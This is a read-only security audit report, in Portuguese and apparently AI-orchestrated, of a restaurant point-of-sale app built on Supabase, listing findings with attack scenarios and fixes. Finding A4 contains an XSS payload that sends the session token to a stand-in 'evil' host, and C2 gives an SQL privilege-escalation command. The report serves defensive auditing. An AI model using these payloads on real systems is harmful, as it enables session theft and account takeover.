# VARREDURA — Auditoria de Fluxos GastroMundi

Auditoria **read-only**, end-to-end, orquestrada em 8 fluxos por múltiplos modelos.
Nenhum arquivo de código do repositório foi alterado — este relatório é o único
entregável. Cada achado foi medido contra um contrato fixo de 8 invariantes e passou
por verificação adversarial (≥2 leituras céticas) antes de entrar aqui. Runtime
validado: `npm test` verde (exit 0).

- **Data:** 2026-07-23
- **Escopo:** PDV/Venda/Pagamento, Comanda/Mesa, Caixa/Financeiro, Cozinha/KDS,
  Impressão, Estoque/Ficha técnica, Multi-tenant/Auth/RLS/Planos/Edge, Realtime/Sync/Palm.
- **Método:** orquestrador (Planejar → fan-out paralelo, 1 dono por fluxo → sintetizar/validar).

## Contrato de auditoria (invariantes)

1. `.error` em toda escrita Supabase (insert/update/delete/upsert/rpc).
2. Dinheiro — centavos/arredondamento, soma vs total, split/troco/desconto, sem float drift, sem cobrança dupla.
3. RLS/tenant — todo UPDATE/DELETE filtra por tenant; sem vazamento cross-tenant.
4. RPC SECURITY DEFINER — `REVOKE FROM PUBLIC/anon`; sem guarda que falha-aberto com claim NULL.
5. Concorrência — lost-update em array/jsonb read-modify-write; estado local desatualizado.
6. Segredos — nada hardcodado (só `import.meta.env.VITE_*`); sem `select *` em tabela sensível.
7. XSS — sem `innerHTML`/`document.write`/`dangerouslySetInnerHTML` com dado de usuário.
8. Validação de input antes de qualquer op no Supabase.

---

## Sumário executivo

**Total: 2 Críticos, 10 Altos, 13 Médios, 17 Baixos + 1 Info** (após dedup entre fluxos).

Os dois **Críticos** são latentes hoje (produção roda com 1 tenant) mas **ativam no
exato momento em que o 2º estabelecimento for provisionado** — e a Edge
`provisionar-estabelecimento` que faz isso **já está deployada**. Ambos estão na
camada `users`/auth, que ficou de fora do isolamento multi-tenant que cobre bem as
outras 24 tabelas.

Fora deles, os riscos ativos hoje se concentram em três padrões que se repetem entre
fluxos:

1. **`.error` ignorado com update otimista** — a UI mostra sucesso (toast "✓") enquanto
   a escrita falhou; perda silenciosa de pedido, fechamento de caixa, ajuste de estoque
   e roteamento de impressão. Aparece em quase todos os fluxos.
2. **Lost-update / concorrência sem trava** — `pending.items` reescrito por inteiro sem
   versionamento; finalização de venda sem idempotência; caixa aberto/fechado sem trava
   entre terminais. Dois dispositivos na mesma comanda = pedido/dinheiro perdido sem sinal.
3. **XSS armazenado na impressão** — `obs`/identidade do tenant interpolados sem escape
   em `document.write` numa janela same-origin com acesso ao token de sessão. **Triplo-confirmado**
   pelos fluxos PDV, Cozinha e Impressão.

E uma superfície de segurança de banco **verificada diretamente**: duas RPCs SECURITY
DEFINER (`baixar_estoque`, `confirmar_renovacao_assinatura`) com guarda **fail-open** em
claim NULL **e sem `REVOKE` de PUBLIC/anon** → alcançáveis com a anon key pública.

### Top 8 riscos (priorizados)

| # | Sev | Achado | Fluxo(s) | Ativo hoje? |
|---|-----|--------|----------|-------------|
| 1 | 🔴 Crítico | Tabela `users` sem isolamento por tenant | 07 | Ao 2º tenant |
| 2 | 🔴 Crítico | Escalonamento admin → `plataforma` (super-admin) via `users_update_admin` | 07 | Ao 2º tenant |
| 3 | 🟠 Alto | RPCs `baixar_estoque` + `confirmar_renovacao_assinatura` fail-open e anon-reachable | 06 | **Sim** |
| 4 | 🟠 Alto | Lost-update em `pending.items` entre dispositivos (perda silenciosa de itens/dinheiro) | 02, 08 | **Sim** |
| 5 | 🟠 Alto | XSS armazenado na impressão (`renderizar.js` + `document.write` same-origin) | 01, 04, 05 | **Sim** |
| 6 | 🟠 Alto | Dupla finalização / cobrança dupla — sem idempotência atrelada à comanda | 01 | **Sim** |
| 7 | 🟠 Alto | `manage-user` autoriza por papel sem checar tenant → account takeover cross-tenant | 07 | Ao 2º tenant |
| 8 | 🟠 Alto | `.error` ignorado + update otimista (pedido/caixa/estoque somem sem aviso) | 01–08 | **Sim** |

---

## Achados por severidade (deduplicados)

### 🔴 Crítico

**C1 — Tabela `users` sem qualquer isolamento por tenant** · invariante #3 · **Confirmado**
`supabase/migrations/20240108_fix_jwt_role_claim.sql:78-86` + `20260724_multitenant_fase2_isolamento.sql:78-89`
As policies de `users` (`users_select/insert/update/delete_admin`) checam só
`gastro_role = 'admin'` — **sem filtro de tenant**. `users` não está na lista das 24
tabelas isoladas da Leva 2, e nenhuma migration posterior adiciona
`users_tenant_isolation` (só existe `users_select_self`).
- **Cenário:** com o 2º estabelecimento, o admin do tenant A faz
  `from('users').select('id,username,name,role,auth_id,tenant_id')` e recebe **todo o
  staff de todos os tenants**; pode `insert/update/delete` linhas de outro tenant.
- **Correção:** incluir `users` no padrão da Leva 2 — policy
  `AS RESTRICTIVE FOR ALL USING (tenant_id = tenant_atual_id()) WITH CHECK (tenant_id = tenant_atual_id())`;
  super-admin do Console usa RPC dedicada, não a policy genérica.

**C2 — Escalonamento de papel admin → `plataforma` (super-admin) via `users_update_admin`** · invariante #7 · **Confirmado**
`supabase/migrations/20240108_fix_jwt_role_claim.sql:82-84`
O `WITH CHECK` só valida que o **caller** é admin — não restringe `role`/`tenant_id` de
**destino**. A constraint `users_tenant_por_papel` só exige `tenant_id IS NULL` para
`plataforma`, o que o próprio UPDATE satisfaz.
- **Cenário:** admin do tenant A roda
  `update users set role='plataforma', tenant_id=null where auth_id=auth.uid()`. No próximo
  login o hook injeta `gastro_role='plataforma'` → `is_super_admin()=true` → Console,
  leitura cross-tenant, `provisionar_tenant`/`alterar_plano_tenant`. Elevação completa.
- **Correção:** trigger `BEFORE INSERT/UPDATE` em `users` que rejeita mudança de `role`
  para valor superior ao do caller e proíbe `plataforma` fora do Console; ou tirar `role`
  das colunas atualizáveis pelo app e mover gestão de papel para RPC SECURITY DEFINER guardada.

> Ambos os Críticos estão **latentes** hoje (1 tenant) mas ativam assim que a Edge
> `provisionar-estabelecimento` (já deployada) criar o 2º estabelecimento.

### 🟠 Alto

**A1 — RPCs `baixar_estoque` e `confirmar_renovacao_assinatura`: fail-open com claim NULL + sem REVOKE** · invariante #4 · **Confirmado (verificado diretamente no SQL)**
`supabase/migrations/20260722_fix_jwt_role_claim_v2.sql:164-184` (baixar_estoque, guarda linha 171) e `:211-249` (confirmar_renovacao_assinatura, guarda linha 226)
Guarda: `IF (auth.jwt() -> 'app_metadata' ->> 'gastro_role') NOT IN ('caixa','gerente','admin') THEN RAISE EXCEPTION`.
Em PL/pgSQL, com o claim **NULL**, `NULL NOT IN (...)` → **NULL**, e `IF NULL` é tratado
como falso → exceção **não** dispara, UPDATE prossegue. As funções só fazem
`GRANT EXECUTE ... TO authenticated`; **grep confirma que não há `REVOKE ... FROM PUBLIC/anon`**
para nenhuma das duas (existe REVOKE apenas para `custom_access_token_hook`,
`verificar_senha_admin`, `alterar_plano_tenant`, `provisionar_tenant`). Como o Postgres
concede EXECUTE a PUBLIC por padrão, `anon` (parte de PUBLIC) invoca via
`/rest/v1/rpc/...` com a anon key pública; para `anon`, `auth.jwt()` é NULL → fail-open.
- **Cenário:** atacante anônimo zera o saldo de qualquer produto (`baixar_estoque`) e
  confirma renovação de assinatura sem pagar (`confirmar_renovacao_assinatura`).
- **Correção:** `IF coalesce(auth.jwt()->'app_metadata'->>'gastro_role','') NOT IN (...)` +
  `REVOKE EXECUTE ON FUNCTION ... FROM PUBLIC, anon;` nas duas. (O padrão correto já existe
  para `is_super_admin()`/`provisionar_tenant`/`alterar_plano_tenant` — não foi replicado aqui.)

**A2 — Lost-update em `pending.items` entre dispositivos (perda silenciosa de itens/dinheiro)** · invariante #5 · **Confirmado**
`src/context/AppContext.jsx:374-377` (`updatePending`) · `PDVView/index.jsx:209-216, 238-243, 342-391, 996-1011` · `MobilePage.jsx:138-143`
Todo write-path da comanda faz read-modify-write client-side do array `items` inteiro e
grava com `update({items,total}).eq("id",id)` — **sem versão, sem `.select()`, sem merge**.
É last-write-wins sobre o documento inteiro.
- **Cenário:** garçom A (Palm) e B (Palm/caixa) lançam na mesma comanda quase juntos; cada
  um parte do seu `selected.items` local (não resincronizado) → quem grava por último apaga
  os itens do outro. Ambos veem "✓ Pedido enviado". Vale para lançar, cancelar item e
  transferir. (Flow 08 classificou como **Crítico** pela perda financeira silenciosa.)
- **Correção:** append atômico no servidor (RPC com `items = items || :novos`), ou optimistic
  locking (`... WHERE id=$1 AND updated_at=:versao` + checar linhas). O padrão já existe em
  `updateUser` (`AppContext.jsx:453-466`) — não foi replicado em `pending`.

**A3 — `selected` nunca resincroniza com `pending` (amplifica A2) + pagamento fecha com snapshot stale** · invariante #5 e #2 · **Confirmado**
`PDVView/index.jsx:55` (sem `useEffect` sobre `pending`) · `useFinalizarPagamento.js:40-48`
`selected` é um snapshot congelado no clique; nunca reflete UPDATEs remotos. Na
finalização, `finalizarPagamento` monta a venda de `[...selected.items(stale), ...cartItems]`
→ item lançado por outro dispositivo entre "ir ao caixa" e "confirmar" **não entra na
venda e é apagado com o `removePending`** (nem cobrado, nem em cancelados). Perda
financeira direta.
- **Correção:** derivar `selected` de `pending.find(o=>o.id===selectedId)` (guardar só o id);
  reler `pending` do banco imediatamente antes de fechar, idealmente via RPC atômica de fechamento.

**A4 — XSS armazenado na impressão (obs/nome/identidade sem escape em `document.write`)** · invariante #7 · **Confirmado (triplo — fluxos 01, 04, 05)**
`src/lib/impressao/renderizar.js:27-140` (interpolação) + `:152-166` (`window.open("","_blank")` sem `noopener` → `win.document.write(html)`)
`it.nome`, `it.obs`, `identidade.nome/endereco/cnpj/rodape/logoUrl`, `garcom`, `mesa`,
`comanda` são interpolados crus em template string e escritos numa janela **same-origin**
(about:blank herda a origem) com `window.opener` acessível. O campo obs é `<input maxLength=120>`
livre em `CartPanel.jsx:273-282`, sem `sanitizeInput` (que existe e é usado em outras telas).
- **Cenário:** obs `<img src=x onerror="fetch('//evil/'+localStorage.token)">` → ao imprimir
  via de produção/comprovante, o script lê o token de sessão do Supabase no `localStorage` e
  exfiltra. `identidade.*` é configurável pelo tenant (white-label) → mesmo vetor.
- **Correção:** `escapeHtml()` em todo campo dinâmico em `renderizar.js`; `noopener` no
  `window.open`; `sanitizeInput` no obs em `CartPanel.jsx`; validar `logoUrl` (só `https:`/`data:image`);
  `sandbox="allow-same-origin"` no iframe de preview de `PerfilImpressora.jsx:233`.

**A5 — Dupla finalização / cobrança dupla — sem idempotência atrelada à comanda** · invariante #2 e #5 · **Confirmado**
`useFinalizarPagamento.js:46` (`id: crypto.randomUUID()`) · `PDVView/index.jsx:250-262` · `AppContext.jsx:368-372` (`removePending` delete incondicional)
`sale.id` é aleatório a cada chamada → o `PG_UNIQUE_VIOLATION` idempotente do dual-write
nunca colide. Sem re-checagem de que a pending ainda existe/está `open` antes de gravar.
- **Cenário:** (a) mesma comanda em dois dispositivos, ambos confirmam; ou (b) `addSale`
  grava mas a resposta se perde → catch não remove a pending → operador recarrega e finaliza
  de novo. Resultado: **duas linhas `sales`/`vendas`, receita dobrada, estoque baixado duas
  vezes, dois lançamentos no Financeiro.** Os guards `confirmando`/`salvando` só cobrem a
  mesma instância.
- **Correção:** `sale.id` determinístico da pending (`venda_<pending.id>`) para colidir na 2ª
  gravação, ou RPC atômica `DELETE FROM pending WHERE id=$1 AND status='open' RETURNING` que só
  grava a venda se removeu 1 linha.

**A6 — `manage-user` autoriza por papel sem checar tenant → account takeover cross-tenant** · invariantes #6/#7 · **Confirmado**
`supabase/functions/manage-user/index.ts:51-59, 95-111`
Valida que o caller é `admin`, mas **não confere se o `auth_id` alvo pertence ao mesmo
tenant**. `update_password`/`delete` operam direto em `auth.users` com `SERVICE_ROLE_KEY`.
Combinado com C1 (admin lê o `auth_id` de qualquer tenant): admin do tenant A troca a senha
do admin do tenant B (assume a conta) ou o deleta (lockout do vizinho).
- **Correção:** buscar o alvo em `public.users` e exigir `alvo.tenant_id = caller.tenant_id`
  (ou papel `plataforma` para operar cross-tenant); validar/limitar o `role` recebido no body.

**A7 — `addFechamento` insere sem checar `.error` e fecha o caixa mesmo em falha** · invariante #1 · **Confirmado**
`src/context/AppContext.jsx:485-492` (chamado por `DesktopLayout.jsx:171-176`)
Update otimista local + `insert({data:f})` sem checar retorno; o chamador **sempre** faz
`setCaixaAberto(false)` + `emitirEvento("caixa.fechado")`. Se o insert falhar (RLS, rede,
JWT sem `tenant_id`), o caixa é marcado fechado, o Jarvas recebe o evento, mas o **registro
de conferência (vendas × contado × diferença) nunca foi gravado** — perda de trilha de
auditoria financeira, invisível até o refresh.
- **Correção:** checar `.error`; não fechar o caixa nem emitir evento em falha; avisar o operador.

**A8 — Estado do caixa (fundo/aberto/sessão) gravado fire-and-forget** · invariante #1 · **Confirmado**
`src/context/AppContext.jsx:550-564`
`setFundoAtual/setCaixaAberto/setSessaoAbertaEm` fazem `config.upsert` sem checar erro, após
já ter alterado o estado local. Se falhar, a UI mostra caixa aberto com fundo X mas o próximo
bootstrap devolve o valor antigo → **fundo divergente entra direto no "esperado" do fechamento
e vira falta/sobra fantasma.** Caixa é tabela sensível — não deveria ser fire-and-forget.
- **Correção:** checar `.error` e refletir falha na UI.

**A9 — Falha de leitura do KDS é indistinguível de "cozinha vazia"** · invariante #1 (adaptado) · **Confirmado**
`src/utils/hooks.js:145-154` (`usePedidosCozinha`)
`.then(({ data }) => ...)` nunca lê `error`; se a query falhar (RLS por JWT expirado, rede),
`data` vem `undefined`, `(data ?? [])` vira `[]`, painel mostra "Nenhum pedido aqui." — mesmo
visual de cozinha vazia. **Comandas pagas/lançadas somem do painel sem aviso.** Contraria o
CLAUDE.md ("erro sempre visível").
- **Correção:** capturar `error`, expor terceiro estado no hook, banner de erro diferenciado do vazio.

**A10 — Race `removePending` (fechamento) × `updatePending` (lançamento) → pedido descartado sem sinal** · invariante #5 + #1 · **Confirmado**
`useFinalizarPagamento.js:114` vs `MobilePage.jsx:143` / `AppContext.jsx:374-377`
Caixa finaliza (`DELETE ... WHERE id=42`) no instante em que o garçom lança
(`UPDATE ... WHERE id=42`). Se o delete for primeiro, o update casa 0 linhas — PostgREST
retorna 2xx e, como `updatePending` não usa `.select()` nem checa contagem, o app não percebe.
Toast de sucesso, item nunca existiu.
- **Correção:** `.update(...).eq("id",id).select()` + checar `data.length===0`; guard de UI
  desabilitando "Lançar" quando a comanda saiu de `pending`.

### 🟡 Médio

- **M1 — `.error` ignorado + update otimista (padrão generalizado)** · invariante #1 · **Confirmado** — mesmo defeito de A7–A8, replicado em: `addPending`/`updatePending` (`AppContext.jsx:361-366, 374-377` — fluxos 01,02,08), ajustes de estoque `updateEstoque/bulkSetEstoque/setMinimoEstoque` (`AppContext.jsx:498,514,544` — fluxo 06), roteamento `RoteamentoCategorias.jsx:56-73` e locais `LocaisImpressao.jsx:120-130,132-161` (`toggleAtivo`/`confirmarDelete` — fluxos 04,05). Em todos a UI mostra sucesso e o dado diverge do banco até o refresh. Correção uniforme: destructurar `{error}`, logar, reverter o otimismo. *(Tratado em bloco na seção "Correção direta".)*
- **M2 — `limpar_reserva_mesa` SECURITY DEFINER sem guarda de role nem tenant** · invariante #4/#3 · **Confirmado** — `supabase/migrations/20260702_rpc_limpar_reserva_mesa.sql:12-25` (chamada em `useFinalizarPagamento.js:116`). Roda como owner, filtra só `WHERE numero = mesa_numero`. Qualquer autenticado libera reservas; com 2º tenant (PK global por `numero`) um caixa limpa a reserva da mesa "5" de outro tenant. O comentário em `schema.sql:381` afirma que a checagem de role existe — **não existe**. Correção: adicionar guarda de papel + `AND tenant_id = tenant_atual_id()`; corrigir o comentário.
- **M3 — Métodos não mapeados geram falta fantasma no fechamento** · invariante #2 · **Confirmado** — `FechamentoModal.jsx:50-63`. `totalSistema` soma o total de TODAS as vendas, mas `totalConferido` só os métodos em `meios` → `diferencaTotal` abre negativo em `-Σ(naoMapeados)`. Mesmo efeito se o tenant remover `dinheiro` de `meios` (fundo somado mas sem linha conferível). Correção: só somar ao esperado o que é conferível; garantir linha conferível para o fundo.
- **M4 — Cancelar/lançar item de comanda já fechada falha silenciosamente** · invariante #5 · **Confirmado** — `AppContext.jsx:368-377`. `updatePending` sobre linha já deletada casa 0 linhas, HTTP 2xx, "sucesso" fake. Correção: `.select()` + checar `data.length===0` e erro explícito. *(Mesma raiz de A10.)*
- **M5 — `grupos_categoria`/`categoria_grupo` novas sem `tenant_id` nem isolamento** · invariante #3 · **Confirmado** — `supabase/migrations/20260732_grupos_categoria.sql:21-63`. Criadas depois da Leva 2, RLS ligada mas só policy por papel, sem RESTRICTIVE de tenant; `grupos_categoria.nome` é `UNIQUE` global. A própria migration reconhece o débito. Correção: aplicar o padrão da 20260724 + trocar UNIQUE global por `(tenant_id, …)`.
- **M6 — Sangria e suprimento inexistentes → esperado do caixa estruturalmente errado** · invariante #2 · **Plausível (gap de escopo)** — `FechamentoModal.jsx:50-51` e ausência geral (`grep sangria|suprimento` → 0). Qualquer retirada/reforço durante o turno não é subtraída do esperado → "falta" real e legítima toda vez. Correção: ledger de movimentação de caixa somado ao esperado.
- **M7 — Sem guarda de concorrência para abrir/fechar caixa** · invariante #5 · **Plausível** — `AppContext.jsx:555-559`, `DesktopLayout.jsx:171-189`. `caixa_aberto`/`fundo`/`sessao` só no bootstrap, sem realtime. Dois terminais: A abre; B vê "Fechado" e abre de novo, sobrescreve `fundo`/`sessao` (last-write-wins). Também dá para fechar duas vezes. Correção: RPC SECURITY DEFINER com checagem de estado, ou realtime + revalidação no confirm.
- **M8 — `verificar_senha_admin` valida senha contra admins de QUALQUER tenant** · invariante #3 · **Confirmado (lógica)** — `supabase/migrations/20240106_rpc_verificar_senha.sql:41-50` (usado por `adminAuth.js:15-21`). No modo `p_username=NULL` retorna true se qualquer admin/gerente ativo de qualquer tenant tiver aquela senha. Correção: `AND pu.tenant_id = tenant_atual_id()` nas consultas.
- **M9 — Roteamento por categoria é código morto** · qualidade · **Confirmado** — `RoteamentoCategorias.jsx`/`LocaisImpressao.jsx` gravam destino por categoria, mas `getLocalImpressao`/`buildRoteamentoMap` (`utils/impressao.js`) nunca são chamados: `montarViaProducao` sempre imprime na mesma janela. Config sem efeito — o dono acha que roteou e nada acontece. Correção: ligar o roteamento ao caminho de impressão ou remover a tela até implementá-lo.
- **M10 — Botão "Imprimir via" sem trava de duplo clique** · invariante #5 (adaptado) · **Confirmado** — `CozinhaView.jsx:74-79,156-162`. `handleImprimirVia` não usa o `processando[pedido.id]` que os outros botões usam → duplo toque = duas vias físicas. Correção: reusar o padrão `processando`.
- **M11 — `.error` ignorado nas escritas de roteamento/locais de impressão** · invariante #1 · **Confirmado** — subconjunto de M1, específico de `RoteamentoCategorias.jsx` e `LocaisImpressao.jsx` (`toggleAtivo`, `confirmarDelete`); `salvar()`/`fetchLocais()` no mesmo arquivo fazem certo. Correção: replicar `if (error) throw error`.
- **M12 — XSS na via de produção (KDS) — mesma raiz de A4** · invariante #7 · **Confirmado** — `renderizar.js:114-121` via `CozinhaView.jsx:74-79`. Consolidado em A4 (correção única cobre os dois caminhos de impressão).
- **M13 — `.error` ignorado em `addPending`/`updatePending` no fluxo comanda** · invariante #1 · **Confirmado** — subconjunto de M1, registrado por fluxo 02 (`AppContext.jsx:361-366, 374-377`).

### 🔵 Baixo

- **B1 — `handleConfirmPayment` engole o erro → checkout trava em "Processando..."** · `PDVView/index.jsx:256-261` + `CheckoutView.jsx:124-135` — o catch faz `setSalvando(false)` mas não re-lança; `confirmando` fica `true` e o operador recarrega (alimenta A5). Correção: re-lançar/retornar status para o CheckoutView resetar.
- **B2 — Tolerância de split permite divergência de ~1 centavo** · `CheckoutView.jsx:92` (`Math.abs(faltaAlocar) < 0.015`) — `sale.total` fica certo, mas `venda_pagamentos`/Financeiro somam ~1,49¢ diferente. Correção: ajustar o último pagamento para `total - Σ(anteriores)`.
- **B3 — `updatePending`/`addPending` sem `.error` (fluxo PDV)** — subconjunto de M1.
- **B4 — `handleTransferir` sem tratamento de erro em `Promise.all`** · `PDVView/index.jsx:370-391` — origem grava e destino falha (ou vice-versa) → itens somem da origem sem crédito no destino. Correção: checar erro de cada write; idealmente transferência transacional no Postgres.
- **B5 — Falha da corrida otimista em `iniciarPreparo`/`marcarPronto` só loga no console** · `CozinhaView.jsx:52-53,63-64` — o guard `.eq("status_cozinha",...)` funciona (sem regressão de status), mas o "perdedor" não vê mensagem. Correção: toast curto. *(Só UX — integridade OK.)*
- **B6 — `select("*")` em `lancamentos` (tabela financeira sensível)** · `src/lib/financeiro.js:114` — RLS restringe, mas viola a diretriz do CLAUDE.md. Correção: colunas explícitas.
- **B7 — `diferencaTotal` sem tolerância de centavo na classificação sobra/falta** · `FechamentoModal.jsx:63,225-236` — resíduo `-1e-13` rotula caixa batido como "Falta −R$ 0,00". Cosmético. Correção: tolerância ~0,005.
- **B8 — Ficha técnica / `fator_consumo_estoque` não aplicados em nenhuma baixa** · `useFinalizarPagamento.js:126-129`, `ProdutosView.jsx:293` (fator hardcoded `1`) — vender prato **não consome insumos**; conversão só em exibição. Lacuna funcional documentada (não regressão). Correção: baixa por insumo quando o recurso entrar.
- **B9 — `GREATEST(0,...)` absorve oversell + guarda `atual>0` pula saldo local zerado** · `20260712_estoque_alerta_minimo.sql:29`, `useFinalizarPagamento.js:127-128` — oversell some sem registro; produto com saldo local defasado não recebe baixa. Correção: deixar a decisão de baixar no servidor; registrar oversell.
- **B10 — `verificarEstoqueMinimo` usa `anterior` do estado local otimista** · `estoque.js:104` — sob baixas concorrentes o alerta de mínimo pode atrasar. Saldo OK. Correção: derivar `anterior` de `quantidade + p_qtd` da mesma transação.
- **B11 — RPC de baixa com 0 linhas (produto sem linha em `estoque`) é no-op e o cliente fabrica saldo** · `estoque.js:100-101` — fallback local grava saldo sem linha no banco. Correção: tratar `data` vazio como "produto sem controle de estoque".
- **B12 — Sem filtro de caracteres de controle antes do ESC/POS raw** · `escposFormatador.js`/`largura.js`/`qztray.js:23-28` — byte ESC colado num obs pode injetar comando na impressora térmica. Correção: stripar `\x00-\x1F` (exceto `\n`) junto com o escape de A4.
- **B13 — Reconciliação ausente após reconexão do realtime** · `AppContext.jsx:274-291` (`pending-realtime`) — Supabase Realtime não faz replay; sem listener de reconexão que dispare re-fetch. Palm em wifi instável opera com `pending` stale sem indicação. Correção: no `subscribe((status)=>...)`, ao voltar a `SUBSCRIBED` após queda, re-fetch de `pending`.
- **B14 — Payload de `postgres_changes` aplicado sem validação de forma** · `AppContext.jsx:277-286` — `payload.new` gravado direto sem checar `Array.isArray(items)` (diferente de `usePedidosCozinha`, que valida). Correção: replicar a validação de forma antes de `setPendingLocal`.
- **B15 — Colisão multi-tenant na PK global de `config` com falha silenciosa** · `AppContext.jsx:552-563` + `20260724:48-66` — `config` PK ainda global por `key`; com 2º tenant o upsert colide, RLS barra, e (com M1) falha sem aviso. Correção: PK `(tenant_id, key)` antes do 2º tenant.
- **B16 — `UNIQUE(categoria)` global em `categorias_roteamento`** · `20260724:48-66` — débito já rastreado; com 2º tenant o `upsert(...,{onConflict:"categoria"})` colide no índice global. Correção: `(tenant_id, categoria)`.
- **B17 — Duplo clique na finalização coberto só na mesma instância** — registrado; a cobertura real vem de A5 (idempotência).

### ℹ️ Info / dívida documentada

- **I1 — `pending` sem coluna de tenant e RLS por `auth.role()='authenticated'`** · `supabase/schema.sql:54-67`, `20240107_rls_por_role.sql:66-71` — **não é exploração ativa** (1 tenant hoje, `lib/tenant.js:29-31` documenta). Mas no dia do multi-tenant real, `pending_all_auth` e o canal `pending-realtime` (sem filtro) vazam entre estabelecimentos sem nenhuma mudança de código sinalizada. Registrar para não esquecer o filtro quando `tenant_id` entrar em `pending`.

---

## Ações: "correção direta" vs "exige decisão"

### ✅ Correção direta (mecânica, baixo risco, pode ir já)

Fixes autocontidos, com padrão-modelo já existente no próprio código-base:

1. **Adicionar `.error` + reverter otimismo** em todas as escritas do bloco M1/A7/A8:
   `addPending`, `updatePending`, `removePending`, `updateEstoque`, `bulkSetEstoque`,
   `setMinimoEstoque`, `addFechamento`, `setFundoAtual/setCaixaAberto/setSessaoAbertaEm`,
   `RoteamentoCategorias.handleChange`, `LocaisImpressao.toggleAtivo/confirmarDelete`.
   Modelo: `updateUser` (`AppContext.jsx:453-466`).
2. **XSS impressão (A4):** `escapeHtml()` em `renderizar.js` + `noopener` no `window.open` +
   `sanitizeInput` no obs de `CartPanel.jsx` + validar `logoUrl` + `sandbox` no iframe de preview
   + strip de controle ESC/POS (B12).
3. **`REVOKE ... FROM PUBLIC, anon` + guarda `coalesce(...)` NULL-safe** em `baixar_estoque`
   e `confirmar_renovacao_assinatura` (A1). ⚠️ **Migration nova → lembrar de aplicar no painel
   Supabase; RLS/grants precisam ser reconfigurados lá.**
4. **Guarda de role + `tenant_id`** em `limpar_reserva_mesa` (M2) e corrigir o comentário mentiroso do schema.
5. **`AND tenant_id = tenant_atual_id()`** em `verificar_senha_admin` (M8).
6. **Estado de erro visível** em `usePedidosCozinha`/KDS (A9); `processando` no botão "Imprimir via" (M10); toast na corrida da cozinha (B5).
7. **Financeiro:** colunas explícitas em `listarLancamentos` (B6); tolerância de centavo em `FechamentoModal` (B7); ajuste do último pagamento no split (B2); métodos não mapeados fora do esperado (M3).
8. **Re-lançar erro** em `handleConfirmPayment` (B1); validação de forma no payload realtime (B14).

### 🤔 Exige decisão (arquitetural / de produto / de dono)

Mudam contrato, fluxo de pagamento ou modelo de dados — precisam de aval antes:

1. **Isolamento da tabela `users` (C1) + trigger anti-escalonamento de papel (C2).** Toca a
   camada de auth e o Console super-admin; a policy RESTRICTIVE genérica pode quebrar o fluxo
   do Console se não houver RPC dedicada. **Bloqueante para provisionar o 2º tenant.**
2. **`manage-user`: guarda cross-tenant (A6).** Decidir a semântica: admin só opera no próprio
   tenant; `plataforma` opera cross-tenant. **Bloqueante para o 2º tenant.**
3. **Idempotência da finalização (A5)** — `sale.id` determinístico *ou* RPC atômica de fechamento.
   Muda como a venda é persistida.
4. **Concorrência de comanda (A2/A3/A10/M4)** — append atômico via RPC + `selected` derivado de
   `pending`. Refactor do write-path do PDV/Palm.
5. **Trava de transição do caixa (M7)** e **ledger de sangria/suprimento (M6)** — desenho de
   concorrência e de feature financeira.
6. **Dívida de PK multi-tenant** (`mesas.numero`, `config.key`, `grupos_categoria`,
   `categorias_roteamento` — M5/B15/B16/I1) — migração a fazer **antes** do 2º tenant.
7. **Ficha técnica / baixa por insumo (B8)** — recurso não implementado; roadmap.
8. **Reconciliação de realtime na reconexão (B13)** e **roteamento de impressão morto (M9)** —
   decidir implementar ou remover a tela.

---

## Mapa dos fluxos + "verificado limpo"

Resumo do que **está são** em cada fluxo (detalhe completo nos anexos por fluxo):

- **01 PDV/Pagamento** — isolamento por tenant nas escritas de venda (default server-side); `addSale` checa `.error` e lança; matemática do split em centavos inteiros sem drift; baixa de estoque agrega e ignora cancelados; TEF/fiscal são stubs fire-and-forget que nunca quebram a venda; sem segredos hardcoded.
- **02 Comanda/Mesa** — RLS RESTRICTIVE em `pending`/`mesas`; somas filtram `!cancelado`; validação de input em `MesasAdmin`; motivo obrigatório no cancelamento.
- **03 Caixa/Financeiro** — isolamento por tenant real em `config`/`fechamentos`/`lancamentos`; validação de valor (`CHECK valor>0`); sinais de fluxo de caixa corretos; `criarLancamento`/`baixarConta`/`NovoLancamentoModal` checam `.error`.
- **04 Cozinha/KDS** — guard otimista de status `.eq("status_cozinha",...)` (sem regressão nem dupla transição); RLS RESTRICTIVE nas 6 tabelas; `CHECK` de status no banco; card do KDS usa JSX puro (React escapa).
- **05 Impressão** — drivers checam/propagam `.error`; `salvar()`/`fetchLocais()`/`PerfilImpressora` corretos; sem `select *`; sem segredos (qz-tray import dinâmico); não há fila de job para "prender".
- **06 Estoque** — decremento atômico no servidor (`GREATEST(0, quantidade - p_qtd)`, sem read-modify-write); `.error` na baixa por venda; `numeric` sem float drift; validade DST-safe; guarda de divisão por zero.
- **07 Multi-tenant** — `is_super_admin()` com `COALESCE(...,false)` + `IS NOT TRUE`; `provisionar_tenant`/`alterar_plano_tenant` com `REVOKE FROM PUBLIC,anon`; 24 tabelas operacionais isoladas por RESTRICTIVE; hook JWT grava só em `app_metadata`; edge functions confiam no JWT, não no body; segredos só em `Deno.env`. **O buraco está concentrado na camada `users`/auth (C1/C2/A6).**
- **08 Realtime/Palm** — canais fazem cleanup correto (sem leak); handlers usam forma funcional (sem stale closure); dedupe de eco por id; `usePedidosCozinha` valida forma do payload; `painelGarcom.js` 100% puro e testado.

---

## Validação (Fase 3)

| Checagem | Resultado |
|----------|-----------|
| `npm test` (runtime, caminho crítico) | ✅ verde (exit 0) |
| Verificação adversarial ≥2 leituras céticas por achado | ✅ feita; refutações registradas nos anexos |
| Fail-open RPC A1 verificado direto no SQL + grep de REVOKE | ✅ Confirmado (anon-reachable) |
| XSS A4 corroborado por 3 fluxos independentes (01/04/05) | ✅ triplo-confirmado |
| Discrepância flow 06 × flow 07 sobre fail-open | ✅ resolvida — funções diferentes; ambos corretos (o fix de 20260730 cobriu `is_super_admin`, não as 2 RPCs de estoque/assinatura) |
| Dedup entre 8 fluxos | ✅ M1/M11/M13/B3 (=`.error`), A4/M12 (=XSS), A2/A10/M4 (=concorrência pending) consolidados |

---

*Auditoria read-only concluída. Nenhuma correção foi aplicada — os itens de "correção
direta" e "exige decisão" aguardam sua priorização. Recomendo tratar A1 (RPCs anon-reachable)
e A4 (XSS) primeiro por serem exploráveis hoje, e C1/C2/A6 como bloqueantes antes de
provisionar o 2º estabelecimento.*
